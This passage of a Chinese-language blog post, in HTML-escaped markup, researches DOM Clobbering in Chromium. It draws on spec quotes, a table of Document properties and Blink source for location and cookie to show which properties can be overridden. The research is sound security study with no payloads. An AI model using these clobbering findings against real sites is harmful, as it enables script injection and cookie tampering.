class="hljs-string">&quot;caption&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;colgroup&quot;</span>, <span class="hljs-string">&quot;frame&quot;</span>, <span class="hljs-string">&quot;frameset&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;tbody&quot;</span>, <span class="hljs-string">&quot;td&quot;</span>, <span class="hljs-string">&quot;tfoot&quot;</span>, <span class="hljs-string">&quot;th&quot;</span>, <span class="hljs-string">&quot;thead&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>]</span><br></pre></td></tr></table></figure><p>PS: &#x8FD9;&#x90E8;&#x5206;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x4E0D;&#x80FD; Clobbered &#xFF0C;&#x56E0;&#x4E3A;&#x6BD4;&#x5982;&#x8BF4;<code>body</code>&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x672C;&#x8EAB;&#x754C;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;<code>body</code>&#x6807;&#x7B7E;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x6211;&#x6D4B;&#x8BD5;&#x6784;&#x5EFA;&#x7684;&#x7B80;&#x5355;&#x7684; HTML &#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x6807;&#x7B7E;&#x4E0D;&#x80FD;&#x88AB; Clobbered &#xFF0C;&#x800C;&#x4E14;&#x5728;&#x5B9E;&#x9645;&#x4E2D;&#x4E5F;&#x7528;&#x5230;&#x6BD4;&#x8F83;&#x5C11;&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E; Chromium &#x4E2D;&#x7684;&#x8BF4;&#x6CD5;&#x662F;&#x201D;but anything by id&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9700;&#x8981;&#x901A;&#x8FC7;<code>Window.id</code>&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#x7684;&#x8BDD;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x529B;&#x53BB;&#x6784;&#x5EFA;&#x4E0B;&#x6587;&#x7684;&#x8981;&#x6C42;&#x3002;</p><h3 id="Dom-Doc"><a href="#Dom-Doc" class="headerlink" title="Dom Doc"></a>Dom Doc</h3><p>&#x5176;&#x5B9E;&#x5728; Dom &#x6807;&#x51C6;&#x4E2D;&#x4E5F;&#x6709;&#x63D0;&#x53CA;&#x8FC7;&#x8FD9;&#x90E8;&#x5206;&#xFF0C;&#x5728;<a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript" target="_blank" rel="noopener">A part of Document interface</a> &#x8FD9;&#x4E00;&#x6BB5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x76F8;&#x5173;&#x89C4;&#x5B9A;&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Document</code> interface <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>;</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><p>&#x4E5F;&#x6709;&#x5173;&#x4E8E;<a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener"> Window &#x5BF9;&#x8C61;&#x7684;&#x90E8;&#x5206;</a>&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Window</code> object <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set" target="_blank" rel="noopener">document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements" target="_blank" rel="noopener">HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>&#x5173;&#x4E8E; window &#x5BF9;&#x8C61;&#xFF0C;&#x867D;&#x7136; window &#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x76EE;&#x524D;&#x8FD8;&#x6CA1;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x6807;&#x7B7E; id &#x8FDB;&#x884C; clobber &#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6BD5;&#x7ADF;&#x662F;&#x57FA;&#x4E8E; Dom &#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x3002;</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>&#x81F3;&#x4E8E; Document &#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x5217;&#x4E3E;&#x4E86;&#x4E00;&#x4E0B; Document &#x5BF9;&#x8C61;&#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x7C7B;&#x578B;&#xFF1A;</p><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[&#x201C;implementation&#x201D;]</td></tr><tr><td>HTMLCollection</td><td>[&#x201C;images&#x201D;, &#x201C;embeds&#x201D;, &#x201C;plugins&#x201D;, &#x201C;links&#x201D;, &#x201C;forms&#x201D;, &#x201C;scripts&#x201D;, &#x201C;anchors&#x201D;, &#x201C;applets&#x201D;, &#x201C;children&#x201D;]</td></tr><tr><td>String</td><td>[&#x201C;documentURI&#x201D;, &#x201C;compatMode&#x201D;, &#x201C;characterSet&#x201D;, &#x201C;charset&#x201D;, &#x201C;inputEncoding&#x201D;, &#x201C;contentType&#x201D;, &#x201C;domain&#x201D;, &#x201C;referrer&#x201D;, &#x201C;cookie&#x201D;, &#x201C;lastModified&#x201D;, &#x201C;readyState&#x201D;, &#x201C;title&#x201D;, &#x201C;dir&#x201D;, &#x201C;designMode&#x201D;, &#x201C;fgColor&#x201D;, &#x201C;linkColor&#x201D;, &#x201C;vlinkColor&#x201D;, &#x201C;alinkColor&#x201D;, &#x201C;bgColor&#x201D;, &#x201C;visibilityState&#x201D;, &#x201C;webkitVisibilityState&#x201D;, &#x201C;nodeName&#x201D;, &#x201C;baseURI&#x201D;]</td></tr><tr><td>HTMLBodyElement</td><td>[&#x201C;body&#x201D;, &#x201C;activeElement&#x201D;]</td></tr><tr><td>HTMLHeadElement</td><td>[&#x201C;head&#x201D;]</td></tr><tr><td>HTMLScriptElement</td><td>[&#x201C;currentScript&#x201D;]</td></tr><tr><td>HTMLAllCollection</td><td>[&#x201C;all&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Window</td><td>[&#x201C;defaultView&#x201D;]</td></tr><tr><td>DocumentType</td><td>[&#x201C;doctype&#x201D;, &#x201C;firstChild&#x201D;]</td></tr><tr><td>Boolean</td><td>[&#x201C;xmlStandalone&#x201D;, &#x201C;hidden&#x201D;, &#x201C;wasDiscarded&#x201D;, &#x201C;webkitHidden&#x201D;, &#x201C;fullscreenEnabled&#x201D;, &#x201C;fullscreen&#x201D;, &#x201C;webkitIsFullScreen&#x201D;, &#x201C;webkitFullscreenEnabled&#x201D;, &#x201C;pictureInPictureEnabled&#x201D;, &#x201C;isConnected&#x201D;]</td></tr><tr><td>FontFaceSet</td><td>[&#x201C;fonts&#x201D;]</td></tr><tr><td>StyleSheetList</td><td>[&#x201C;styleSheets&#x201D;]</td></tr><tr><td>Function</td><td>[&#x201C;getElementsByTagName&#x201D;, &#x201C;getElementsByTagNameNS&#x201D;, &#x201C;getElementsByClassName&#x201D;, &#x201C;createDocumentFragment&#x201D;, &#x201C;createTextNode&#x201D;, &#x201C;createCDATASection&#x201D;, &#x201C;createComment&#x201D;, &#x201C;createProcessingInstruction&#x201D;, &#x201C;importNode&#x201D;, &#x201C;adoptNode&#x201D;, &#x201C;createAttribute&#x201D;, &#x201C;createAttributeNS&#x201D;, &#x201C;createEvent&#x201D;, &#x201C;createRange&#x201D;, &#x201C;createNodeIterator&#x201D;, &#x201C;createTreeWalker&#x201D;, &#x201C;getElementsByName&#x201D;, &#x201C;write&#x201D;, &#x201C;writeln&#x201D;, &#x201C;hasFocus&#x201D;, &#x201C;execCommand&#x201D;, &#x201C;queryCommandEnabled&#x201D;, &#x201C;queryCommandIndeterm&#x201D;, &#x201C;queryCommandState&#x201D;, &#x201C;queryCommandSupported&#x201D;, &#x201C;queryCommandValue&#x201D;, &#x201C;clear&#x201D;, &#x201C;exitPointerLock&#x201D;, &#x201C;createElement&#x201D;, &#x201C;createElementNS&#x201D;, &#x201C;caretRangeFromPoint&#x201D;, &#x201C;elementFromPoint&#x201D;, &#x201C;elementsFromPoint&#x201D;, &#x201C;getElementById&#x201D;, &#x201C;prepend&#x201D;, &#x201C;append&#x201D;, &#x201C;querySelector&#x201D;, &#x201C;querySelectorAll&#x201D;, &#x201C;exitFullscreen&#x201D;, &#x201C;webkitCancelFullScreen&#x201D;, &#x201C;webkitExitFullscreen&#x201D;, &#x201C;createExpression&#x201D;, &#x201C;createNSResolver&#x201D;, &#x201C;evaluate&#x201D;, &#x201C;registerElement&#x201D;, &#x201C;exitPictureInPicture&#x201D;, &#x201C;hasChildNodes&#x201D;, &#x201C;getRootNode&#x201D;, &#x201C;normalize&#x201D;, &#x201C;cloneNode&#x201D;, &#x201C;isEqualNode&#x201D;, &#x201C;isSameNode&#x201D;, &#x201C;compareDocumentPosition&#x201D;, &#x201C;contains&#x201D;, &#x201C;lookupPrefix&#x201D;, &#x201C;lookupNamespaceURI&#x201D;, &#x201C;isDefaultNamespace&#x201D;, &#x201C;insertBefore&#x201D;, &#x201C;appendChild&#x201D;, &#x201C;replaceChild&#x201D;, &#x201C;removeChild&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Array</td><td>[&#x201C;adoptedStyleSheets&#x201D;]</td></tr><tr><td>FeaturePolicy</td><td>[&#x201C;featurePolicy&#x201D;]</td></tr><tr><td>Null</td><td>[&#x201C;xmlEncoding&#x201D;, &#x201C;xmlVersion&#x201D;, &#x201C;onreadystatechange&#x201D;, &#x201C;onpointerlockchange&#x201D;, &#x201C;onpointerlockerror&#x201D;, &#x201C;onbeforecopy&#x201D;, &#x201C;onbeforecut&#x201D;, &#x201C;onbeforepaste&#x201D;, &#x201C;onfreeze&#x201D;, &#x201C;onresume&#x201D;, &#x201C;onsecuritypolicyviolation&#x201D;, &#x201C;onvisibilitychange&#x201D;, &#x201C;oncopy&#x201D;, &#x201C;oncut&#x201D;, &#x201C;onpaste&#x201D;, &#x201C;pointerLockElement&#x201D;, &#x201C;fullscreenElement&#x201D;, &#x201C;onfullscreenchange&#x201D;, &#x201C;onfullscreenerror&#x201D;, &#x201C;webkitCurrentFullScreenElement&#x201D;, &#x201C;webkitFullscreenElement&#x201D;, &#x201C;onwebkitfullscreenchange&#x201D;, &#x201C;onwebkitfullscreenerror&#x201D;, &#x201C;rootElement&#x201D;, &#x201C;pictureInPictureElement&#x201D;, &#x201C;ownerDocument&#x201D;, &#x201C;parentNode&#x201D;, &#x201C;parentElement&#x201D;, &#x201C;previousSibling&#x201D;, &#x201C;nextSibling&#x201D;, &#x201C;nodeValue&#x201D;, &#x201C;textContent&#x201D;]</td></tr></tbody></table><p>&#x5176;&#x4E2D;&#xFF0C;<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> &#x5747;&#x7EE7;&#x627F;&#x81EA;<code>HTMLElement</code>&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x8FD9;&#x4E9B;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x6211;&#x4EEC; Clobber &#x5F97;&#x5230;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x800C; Document &#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>&#x6211;&#x60F3;&#x5982;&#x679C;&#x80FD;&#x8986;&#x76D6;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x7528;<code>document.x</code>&#x7684;&#x65F6;&#x5019;&#xFF0C; Dom &#x6811;&#x89E3;&#x6790;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x8981;&#x4F18;&#x5148;&#x4E8E;<code>document</code>&#x81EA;&#x5DF1;&#x672C;&#x8EAB;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x4EA7;&#x751F;&#x4E86;&#x8FD9;&#x6837;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x4E5F;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x5728;&#x8986;&#x76D6;<code>cookie</code>&#x7684;&#x65F6;&#x5019;&#x5374;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x8986;&#x76D6;&#x5462;&#xFF1F;</p><p>&#x5E26;&#x7740;&#x8FD9;&#x4E9B;&#x7591;&#x95EE;&#xFF0C;&#x6211;&#x7279;&#x5730;&#x53BB;&#x770B;&#x4E86;&#x4E00;&#x4F1A; chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x7B80;&#x7565;&#x5730;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x8FD9;&#x4E9B;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x5728; chromium &#x7684; blink &#x90E8;&#x5206;&#x3002;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x77E5;&#x8BC6;&#x6D45;&#x8584;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x5730;&#x9605;&#x8BFB;&#x8FC7; chromium &#x6E90;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x8FD8;&#x53EF;&#x80FD;&#x8BBE;&#x8BA1;&#x5230;&#x4E00;&#x4E9B;&#x7F16;&#x8BD1;&#x539F;&#x7406;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5B89;&#x5168;&#x628A;&#x6574;&#x4E2A; Chromium &#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7F18;&#x7531;&#x4EE5;&#x4EE3;&#x7801;&#x8FFD;&#x8E2A;&#x7684;&#x5F62;&#x5F0F;&#x5F04;&#x51FA;&#x6765;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x5F04;&#x7684;&#x8BDD;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x53BB; debug Chromium &#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x8FD8;&#x6709;&#x5F85;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x4E0D;&#x8FC7;&#x6211;&#x628A;&#x81EA;&#x5DF1;&#x770B;&#x7684;&#x4E00;&#x4E9B;&#x6709;&#x7528;&#x7684;&#x90E8;&#x5206;&#x5199;&#x51FA;&#x6765;&#x3002;&#x5982;&#x679C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x8054;&#x7CFB;&#x6211;&#x4E00;&#x8D77;&#x7814;&#x7A76;&#x770B;&#x770B;&#x3002;&#xFF08;&#x867D;&#x7136;&#x6211;&#x5F88;&#x83DC;XD</p><p>&#x5168;&#x90E8;&#x4EE3;&#x7801;&#x6765;&#x6E90;&#x4E8E; <a href="https://source.chromium.org/" target="_blank" rel="noopener">Chomiunm Code Search</a>&#xFF0C;&#x8FD9;&#x4E2A;&#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x5BA1;&#x4EE3;&#x7801;&#x3002;</p><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;<code>location</code>&#xFF0C;&#x6211;&#x4EEC;&#x65E2;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>window.location</code>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>document.location</code>&#x62FF;&#x5230;<code>location</code>&#xFF0C;&#x8FD9;&#x4E5F;&#x80FD;&#x8BF4;&#x660E;&#x6211;&#x4EEC;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0A;&#x6587;&#x8981;&#x5355;&#x72EC; fuzz Document &#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x800C;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x5C5E;&#x6027;&#x4E86;&#x3002;</p><p>&#x5728; Chromium &#x6E90;&#x7801;&#x4E2D;&#xFF0C;&#x627E;&#x5230;<code>location</code>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C; Chromium &#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>window</code>&#x5BF9;&#x8C61;&#x7684;<code>location()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x8986;&#x76D6;&#x4E0D;&#x4E86;&#x3002;</p><p>&#x5728;<code>third_party/blink/renderer/core/dom/document.cc</code>&#x4E2D;&#xFF0C;&#x7B2C; 933 &#x884C;&#x4E2D;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">Document::location()</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Location* Document::location() <span class="hljs-keyword">const</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetFrame())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> domWindow()-&gt;location();</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>domWindow()</code>&#x6765;&#x83B7;&#x53D6;<code>location</code>&#xFF0C;&#x5728;<code>third_party/blink/renderer/core/frame/dom_window.cc</code>&#x4E2D;&#xFF0C;&#x7B2C;85&#x884C;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target="_blank" rel="noopener">DOMWindow::location()</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Location* DOMWindow::location() <span class="hljs-keyword">const</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (!location_)</span><br><span class="line">    location_ = MakeGarbageCollected&lt;Location&gt;(<span class="hljs-keyword">const_cast</span>&lt;DOMWindow*&gt;(<span class="hljs-keyword">this</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> location_.Get();</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x53E6;&#x5916;&#xFF0C;&#x6709;&#x4EBA;&#x63D0;&#x8FC7;&#x76F8;&#x5173;&#x7528;&#x5176;&#x4ED6; hook &#x7684;&#x65B9;&#x5F0F; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target="_blank" rel="noopener">Issue 315760: document.domain can be hooked</a>&#xFF0C;&#x91CC;&#x9762;&#x63D0;&#x5230;&#x53EF;&#x4EE5; hook &#x5230; domain &#x8DDF; location &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x76EE;&#x524D; stable chrome &#x4E0A;&#x6D4B;&#x8BD5;&#x53EA;&#x80FD; hook &#x5230; domain &#xFF0C;&#x81F3;&#x4E8E; location &#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4E0D;&#x662F;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x5C3D;&#x7BA1;&#x56DE;&#x590D;&#x7684;&#x662F;&#x201D;Browsers allow hooking these properties. It doesn&#x2019;t matter&#x201D;</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x770B;&#x4E86;&#x4E00;&#x4E0B; Cookie &#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E24;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target="_blank" rel="noopener">Document::cookie</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">String</span> Document::cookie(ExceptionState&amp; exception_state) <span class="hljs-keyword">const</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  CountUse(WebFeature::kCookieGet);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetSecurityOrigin()-&gt;CanAccessCookies()) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (IsSandboxed(mojom::<span class="hljs-built_in">blink</span>::WebSandboxFlags::kOrigin))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;The document is sandboxed and lacks the &apos;allow-same-origin&apos; flag.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Url().ProtocolIs(<span class="hljs-string">&quot;data&quot;</span>))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;Cookies are disabled inside &apos;data:&apos; URLs.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      exception_state.ThrowSecurityError(<span class="hljs-string">&quot;Access is denied for this document.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GetSecurityOrigin()-&gt;IsLocal()) {</span><br><span class="line">    CountUse(WebFeature::kFileAccessedCookies);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!cookie_jar_)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> cookie_jar_-&gt;Cookies();</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">CookieJar::Cookies()</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">String</span> CookieJar::Cookies() {</span><br><span class="line">  KURL cookie_url = document_-&gt;CookieURL();</span><br><span class="line">  <span class="hljs-keyword">if</span> (cookie_url.IsEmpty())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  RequestRestrictedCookieManagerIfNeeded();</span><br><span class="line">  <span class="hljs-keyword">String</span> value;</span><br><span class="line">  backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(),</span><br><span class="line">                             document_-&gt;TopFrameOrigin(), &amp;value);</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x53CA;&#xFF0C;&#x867D;&#x7136; cookie &#x4E0D;&#x80FD;&#x88AB;&#x5B8C;&#x5168;&#x5B57;&#x7B26;&#x4E32;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x88AB; Clobbered 